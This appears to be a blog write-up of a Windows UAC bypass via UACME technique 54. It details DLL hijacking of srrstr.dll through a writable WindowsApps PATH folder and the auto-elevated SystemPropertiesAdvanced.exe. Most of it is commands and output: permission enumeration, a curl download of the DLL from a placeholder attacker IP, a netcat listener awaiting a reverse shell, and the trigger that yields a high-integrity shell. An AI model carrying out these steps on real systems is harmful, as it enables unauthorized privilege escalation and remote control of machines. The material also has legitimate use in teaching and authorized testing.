---
title: User Account Control (UAC) Bypass
date: 2026-06-26 23:41:50
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - UAC Bypass
tags:
  - Privilege-Escalation
  - Windows
  - AccessChk
  - UAC
  - UAC-Bypass
  - UACME
  - Technique-54
  - DLL-Hijacking
  - Auto-Elevation
  - SystemPropertiesAdvanced
  - srrstr.dll
  - WindowsApps
  - PATH
  - Integrity-Level
  - Medium-Integrity
  - High-Integrity
  - Administrator
  - Admin-Approval-Mode
---

> `User Account Control (UAC)` is a Windows security feature that prevents unauthorized privilege escalation. When `Admin Approval Mode (AAM)` is enabled, administrator accounts receive two tokens at login:
>
>   * A standard user token (medium integrity)
>

>
> And
>
>   * A full admin token (high integrity).
>

>
> Processes run under the standard token by default, even for Administrators group members.

> The built-in RID 500 Administrator account always runs at high integrity and is not affected by UAC.

> Our attack scenario: we are a member of the local Administrators group but running at `medium integrity`, we can confirm this with `whoami /priv` shows only standard user privileges:

```cmd
whoami /priv
```

```text
Privilege Name                Description                            State
============================= ====================================== ========
SeShutdownPrivilege           Shut down the system                   Disabled
SeChangeNotifyPrivilege       Bypass traverse checking               Enabled
SeUndockPrivilege             Remove computer from docking station   Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set         Disabled
SeTimeZonePrivilege           Change the time zone                   Disabled
```

> `SeDebugPrivilege`, `SeImpersonatePrivilege`, `SeBackupPrivilege` none of the high-integrity privileges are visible. This confirms we are running the unprivileged token and UAC bypass is applicable.

## Enumeration

### Confirm UAC is enabled

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

> If `EnableLUA` is set to `0x1`, UAC is enabled.

#### Determine the UAC level

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
  Value | Meaning
---|---
0 | Elevate without prompting
2 | Prompt for consent
5 | Prompt for consent on the secure desktop (default)

> The value `0x5` is the highest UAC level. Fewer bypass techniques work at this level.

#### Identify the Windows build

```powershell
[environment]::OSVersion.Version
```

```text
Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

> Build **14393** = Windows 10 release **1607**. We use this to pick the right UACME technique in the next step.

#### Pick the right UACME technique

> The [UACME project](<https://github.com/hfiref0x/UACME>) maintains a list of UAC bypass techniques with three key fields per entry:
>
>   * The affected Windows build
>   * The technique used
>   * Does Microsoft has patched it.
>

> The process:
>
>   1. Take the build number from the previous step (e.g. `14393`)
>   2. Open the UACME table and filter for techniques that cover our build
>   3. Pick a technique that has no security update fixing it on our target, or where the fix has not been applied
>

## Exploitation : UACME Technique 54

> For build 14393, technique 54 applies. `SystemPropertiesAdvanced.exe` (32-bit, SysWOW64) is auto-elevated and attempts to load the non-existent `srrstr.dll`. When Windows cannot find a DLL it walks this search order:

>   1. Directory the application loaded from
>   2. `C:\Windows\System32`
>   3. `C:\Windows\System`
>   4. `C:\Windows`
>   5. Any directory in `%PATH%`
>

> If a writable directory appears in PATH, we drop our malicious DLL there and the auto-elevated binary loads it with high-integrity privileges.

### Step 1 : Find a writable PATH directory

```powershell
cmd /c echo %PATH%
```

> Run AccessChk against each directory, use cmd.exe for the loop :

```cmd
for %i in ("%PATH:;=" "%") do @accesschk64.exe /accepteula -dwvu %~i
```

> Or in PowerShell:

```powershell
$env:PATH -split ';' | ForEach-Object { if ($_ -and (Test-Path $_)) { .\accesschk64.exe /accepteula -dwvu "$_" } }
```

> We are looking for Write, Modify, or Full Control. The `WindowsApps` folder (`C:\Users\<user>\AppData\Local\Microsoft\WindowsApps`) is inside the user profile and writable by the current user : this is our drop location.

### Step 2 : Host the DLL on our attack machine

```bash
sudo python3 -m http.server 8080
```

### Step 3 : Download the DLL to the target

```powershell
curl http://<attacker-ip>:8080/srrstr.dll -O "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

### Step 4 : Start a listener on our attack machine

```bash
nc -lvnp <port>
```

### Step 5 : Test the DLL works

> Before running the actual bypass, confirm the reverse shell fires. Running the DLL directly via `rundll32` gives normal user rights (not elevated) : this is just a connectivity test:

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

> Confirm the shell connects back, check `whoami /priv` shows standard privileges only, then close it and continue.

### Step 6 : Kill any remaining rundll32 processes

> Any leftover `rundll32` processes from the test step will interfere with the bypass. Kill them before continuing:

```cmd
tasklist /svc | findstr "rundll32"
taskkill /PID <pid> /F
```

### Step 7 : Execute the auto-elevated binary

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

### Step 8 : Receive the elevated shell

> The listener catches a connection almost instantly. Confirm we now have high-integrity privileges:

```cmd
whoami /priv
```

```text
Privilege Name                            Description                               State
========================================= ========================================= ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process        Disabled
SeSecurityPrivilege                       Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or objects        Disabled
SeLoadDriverPrivilege                     Load and unload device drivers            Disabled

< SNIP >
```

> `SeImpersonatePrivilege` and `SeDebugPrivilege` are now present and the bypass succeeded and we are running at high integrity.
